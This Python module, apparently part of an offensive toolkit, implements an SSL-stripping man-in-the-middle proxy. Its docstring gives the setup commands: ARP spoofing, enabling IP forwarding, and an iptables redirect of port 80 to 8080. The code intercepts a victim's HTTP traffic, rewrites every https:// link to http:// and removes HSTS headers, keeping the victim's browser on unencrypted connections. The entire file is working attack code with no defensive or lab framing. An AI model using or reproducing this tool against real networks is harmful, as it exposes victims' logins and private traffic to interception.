"""
ssl_strip.py — SSL Stripping via HTTP response rewriting.

Intercepts HTTP responses and rewrites https:// links to http://
so the victim's browser never upgrades to HTTPS.

Requires:
  - ARP spoofing active (to be MITM)
  - IP forwarding enabled: echo 1 > /proc/sys/net/ipv4/ip_forward
  - iptables redirect: iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

This module runs the proxy on port 8080 locally.
"""

import threading
import socket
import re
import logging

log = logging.getLogger("offensive.ssl_strip")

_stop_event  = threading.Event()
_thread      = None
PROXY_PORT   = 8080
_target_ip   = None


def _enable_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        log.info("[SSL] IP forwarding enabled.")
    except Exception as e:
        log.warning(f"[SSL] Could not enable IP forwarding: {e}")


def _strip_https(data: bytes) -> bytes:
    """Replace https:// with http:// in HTTP response body and headers."""
    try:
        text = data.decode("utf-8", errors="replace")
        text = re.sub(r'https://', 'http://', text, flags=re.IGNORECASE)
        # Also strip HSTS headers
        lines = text.split("\r\n")
        lines = [l for l in lines if not l.lower().startswith("strict-transport-security")]
        return "\r\n".join(lines).encode("utf-8", errors="replace")
    except Exception:
        return data


def _forward(client_sock, target_host, target_port, request_data):
    try:
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.settimeout(10)
        server_sock.connect((target_host, target_port))
        server_sock.sendall(request_data)

        response = b""
        while True:
            chunk = server_sock.recv(4096)
            if not chunk:
                break
            response += chunk

        server_sock.close()

        # Strip HTTPS references from response
        stripped = _strip_https(response)
        client_sock.sendall(stripped)
        log.debug(f"[SSL] Forwarded {len(request_data)}B → stripped {len(stripped)}B response")
    except Exception as e:
        log.debug(f"[SSL] Forward error: {e}")
    finally:
        client_sock.close()


def _handle_client(client_sock, addr):
    try:
        data = b""
        client_sock.settimeout(5)
        while True:
            chunk = client_sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if b"\r\n\r\n" in data:
                break

        if not data:
            client_sock.close()
            return

        # Parse Host header
        host = "127.0.0.1"
        port = 80
        lines = data.split(b"\r\n")
        for line in lines:
            if line.lower().startswith(b"host:"):
                host_val = line.split(b":", 1)[1].strip().decode()
                if ":" in host_val:
                    host, port = host_val.rsplit(":", 1)
                    port = int(port)
                else:
                    host = host_val
                break

        t = threading.Thread(target=_forward,
                             args=(client_sock, host, port, data),
                             daemon=True)
        t.start()

    except Exception as e:
        log.debug(f"[SSL] Client handler error: {e}")
        client_sock.close()


def _run(iface, target_ip):
    _enable_forwarding()
    log.info(f"[SSL] Proxy listening on port {PROXY_PORT}")

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PROXY_PORT))
    srv.listen(50)
    srv.settimeout(1)

    while not _stop_event.is_set():
        try:
            client_sock, addr = srv.accept()
            t = threading.Thread(target=_handle_client,
                                 args=(client_sock, addr), daemon=True)
            t.start()
        except socket.timeout:
            continue
        except Exception as e:
            log.debug(f"[SSL] Accept error: {e}")

    srv.close()
    log.info("[SSL] Proxy stopped.")


def start(iface: str = "eth0", target_ip: str = None):
    global _thread, _target_ip
    if _thread and _thread.is_alive():
        stop()
        import time; time.sleep(1)
    _target_ip = target_ip
    _stop_event.clear()
    _thread = threading.Thread(target=_run, args=(iface, target_ip),
                               name="ssl_strip", daemon=True)
    _thread.start()
    log.info(f"[SSL] Started (target={'all' if not target_ip else target_ip})")


def stop():
    _stop_event.set()
    log.info("[SSL] Stop signal sent.")


def is_running() -> bool:
    return bool(_thread and _thread.is_alive() and not _stop_event.is_set())
